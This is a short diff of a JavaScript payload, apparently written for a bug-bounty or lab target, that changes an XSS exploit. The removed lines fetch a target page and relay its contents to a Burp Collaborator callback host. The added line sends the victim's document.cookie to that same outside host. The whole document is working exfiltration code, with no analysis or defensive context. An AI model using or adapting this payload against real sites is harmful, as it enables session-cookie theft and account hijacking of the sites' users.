@@ -12,11 +12,11 @@ function loadXMLDoc(theURL)
         {
             if (xmlhttp.readyState==4 && xmlhttp.status==200)
             {
-                loadXMLDoc('https://mf554bwpw39eqcnotvtoi8g7nytprdg.burpcollaborator.net?a='+xmlhttp.responseText);
+                //loadXMLDoc('https://mf554bwpw39eqcnotvtoi8g7nytprdg.burpcollaborator.net?a='+xmlhttp.responseText);
             }
         }
         xmlhttp.open("GET", theURL, false);
         xmlhttp.send();
     }
 
-loadXMLDoc('https://troubledmachine.br2.bughuntr.net/view/f09d4c45-4212-4008-bdcd-9376c8ec813a');
+loadXMLDoc('https://mf554bwpw39eqcnotvtoi8g7nytprdg.burpcollaborator.net?a='+document.cookie);
